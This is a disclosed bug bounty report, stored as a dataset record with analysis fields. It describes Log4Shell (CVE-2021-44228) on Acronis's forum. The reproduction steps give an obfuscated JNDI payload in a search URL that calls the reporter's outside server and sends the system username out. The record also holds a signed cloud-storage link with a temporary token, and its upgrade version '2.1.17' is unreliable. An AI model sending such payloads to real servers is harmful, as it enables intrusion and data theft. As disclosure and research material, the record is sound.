{
  "reported_to": "Acronis",
  "reported_by": "godiego ",
  "title": "[forum.acronis.com] JNDI Code Injection due an outdated log4j component",
  "content": "\nSummary\nHi team,\nIt seems that the machine is affected by the latest CVE-2021-44228 which grants any authenticated user command execution. The vulnerability affects the remote asset forum.acronis.com and this issue allows to remote attackers to perfom Remote Code Execution via JNDI exfiltration.\nSteps To Reproduce\nVulnerable request is: https://forum.acronis.com/search?s=${j${main:\\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-04363f1f3427b48.test3.ggdd.co.uk/}.\nWhich generates a pingback exfiltrating the information to my controlled server ggdd.co.uk:\n<image_0>\nWe can see that the system username is solr.\nRecommendations\nUpgrade Log4j to latest version, 2.1.17.\nImpact\nRemote OS command injection via JNDI queries.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/a816p8fo6n38be6wukako7fi1du7?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2021-12-19_at_06-05-20_TukTuk.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2021-12-19_at_06-05-20_TukTuk.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTQHMCY4U%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T210548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBdljid9%2FjPiHNvetcd5u6U2JtN5QM0tYTFMhgJeHY%2BSAiEA0l0FrkuiyBiOi8hmQNTVHjzB3bRpCgFTgFgdvCrOwckqugUI9P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDECCTHzi0QvvNwzRIiqOBW%2BGS6%2FPl0KnzrPxR1VEqClXwsegujBB8YT7gS4pNC7TS7MJylYtt3BuvQh9cC04mDHCXBSKtmjHtZvU4NMZRcxFgQ6t1C5SuWFGRG%2FW39%2FfsYxwj3eHPnvupdyLY8aWAvbXKxJ%2FUsznyNO9g7xzwah6wLnuD9EWdzmRdNgL87H5QvoQxx3TrpDMVs4CteP2BEZrsrtTW6QMOVJeYAbi46qtX1Uppmx6Bax4tbLm%2F04PhXOIGS0FXDpxJSuVr%2B%2FYxO7dIHCmWjn53PhA5PkbKsOZlx3LNA7j%2Fr8HqWetHA8JVPSbRnBfHs2pEavZQj19rpNYMDlgNwD9QAB72AB4lLXAhffTHtP4lnu%2BPUNah1BtvJAHbWr6t0kEXctEzxSDTJvshT5%2BNSdHbB6PN6NBqCXg85VZfHNt0klKbaWSwTpl6hvMCCWT%2Fb%2Bz5WP5bcx8O9OGd8yIk1jEYa5AkGAg3GWbMMcqxFTgFqHmjyoswwO1OKgM0LzV0haFfE%2Bov2Um%2FvquxKr9yVhw8DF2x89ZJfea68iOlbyr73cYz0E51pHY6wUPypqr91SKCpPIE383Dtu6kTR4ObVWAZYyIU6CQzafIdnfCboWM6Bc52kdOCaq8rcvfy2U%2F%2Bgkq2ERhBEEFVq7nrgtkErGPEFjSpshMu3gHNvQ3uuiiVdsJu1OyQMz8KafWtmU5q4InDLy8k9ERJbo0dKvEYwcoL0nG%2FgSUPS4Imvi2iJ4vH5WIp7sGDyOoxEIHrnLKAD8HucXp50GxcGpk4eGflhew82vrj3oG3fFNsJ9Qo52%2B7qHgrnk%2FLH4hQMOhp%2FN0zahKIFhXW%2BwjD4tdNH8UENaDq4RXTSpNChdhMKvk6Ux0jhvM98YHzDTyoa%2FBjqxAQnlYZblV25Gd5lfDW129Uylz%2FRYWFsgGrZpC%2BLsdBiqvft%2B7utnYcLFqkL8AMPy7hrXSsWRIs4EIGpR8gCBstTKNl6oKOMLwX6QX9wH7CsoWfXwteR1jcJWx%2FSse5nein5hq2y4bNOj%2BmLEB%2Fb%2Bgy0sg4vXgMQZAuDnrFmxnRUjSHpTEusAdkg19HKX%2Fm%2B75k%2BuncpmIQiA4vh2XdJmVzgR9%2F0r3hmbq6L4aFkvStwcvQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d673610088edabeba38f35cf3f4300c942552c59b161175a2dfef7cb54ab29f5"
  },
  "disclosed_date": 1724850240,
  "report_url": "https://hackerone.com/reports/1430622",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Identify the vulnerable endpoint: https://forum.acronis.com/search?s=${j${main:\\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-04363f1f3427b48.test3.ggdd.co.uk/}"
    ],
    [
      2,
      "Trigger the JNDI injection by sending a crafted request to the endpoint, which exfiltrates system information to a controlled server (ggdd.co.uk)"
    ]
  ],
  "vuln_description": "The vulnerability is a JNDI code injection due to an outdated log4j component (CVE-2021-44228), allowing authenticated users to perform remote code execution via JNDI exfiltration. The attack exploits the log4j library's handling of crafted input strings, leading to command execution on the server.",
  "reason": "The vulnerability is straightforward to exploit once the outdated log4j component is identified. The attack involves a single, well-documented exploit (CVE-2021-44228) without requiring complex interactions or state manipulation. The steps are clear and do not involve novel or subtle logic.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves JNDI code injection due to an outdated log4j component, which is not related to authentication or authorization bypass. The proposed methodologies focus on testing authN/authZ boundaries by swapping user sessions or resource IDs, which does not apply to this type of vulnerability.",
    "is_detectable": false
  }
}